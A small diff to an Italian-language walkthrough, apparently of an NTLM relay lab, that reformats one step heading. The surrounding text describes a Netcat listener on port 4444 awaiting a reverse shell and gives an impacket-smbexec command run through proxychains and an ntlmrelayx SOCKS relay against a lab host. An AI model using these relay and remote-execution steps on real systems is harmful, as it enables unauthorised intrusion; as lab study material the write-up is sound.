@@ -153,7 +153,7 @@ Per effettuare l'upload della 'reverse-shell' implementata al 'Passo 10' si è u
 
 Il comando mette **Netcat** in modalità di ascolto su una porta specifica (4444) in attesa di connessioni TCP in ingresso disabilitando la risoluzione 'DNS' per rendere la connessione più veloce.
 
-#### Passo 13 - Esecuzione della **reverse-shell** sulla macchina *target* attraverso il software **smbexec** (via **proxychains4/ntlmrelayx[socks]**)  ####
+#### Passo 13 - Esecuzione della **reverse-shell** sulla macchina *target* attraverso il software **smbexec** (via **proxychains4/ntlmrelayx[socks]**)
 
 `sudo proxychains4 impacket-smbexec ntlmlab/victim@10.0.0.10`
 
